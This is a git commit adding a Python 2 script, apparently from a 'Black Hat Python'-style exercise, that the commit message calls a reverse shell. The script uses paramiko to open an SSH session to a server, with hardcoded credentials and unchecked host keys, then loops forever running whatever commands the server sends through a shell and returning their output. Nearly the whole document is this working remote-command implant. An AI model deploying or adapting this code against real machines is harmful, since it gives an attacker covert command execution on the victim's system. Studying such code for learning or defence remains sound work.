a3237ca145d070cc7ecf81772231f7a31858d834
Chad 'ShadesOfLight' Furman <chad@chadfurman.com>
2015-01-05 20:40:16 -0500

    added python reverse shell

---
+++ networking/bh_sshRcmd.py
@@ -0,0 +1,29 @@
+import threading
+import paramiko
+import subprocess
+
+hostname = '127.0.0.1'
+username = 'justin'
+password = 'lovesthepython'
+command  = 'ClientConnected'
+
+def ssh_command(ip, user, passwd, command):
+    client = paramiko.SSHClient()
+    # client.load_host_keys('~/.ssh/known_hosts')
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, username=user, password=passwd)
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.send(command)
+        print ssh_session.recv(1024) # receive banner
+        while True:
+            command = ssh_session.recv(1024) # get the command from the SSH server
+            try:
+                cmd_output = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_output)
+            except Exception,e:
+                ssh_session.send(str(e))
+        client.close()
+    return
+
+ssh_command(hostname, username, password, command)
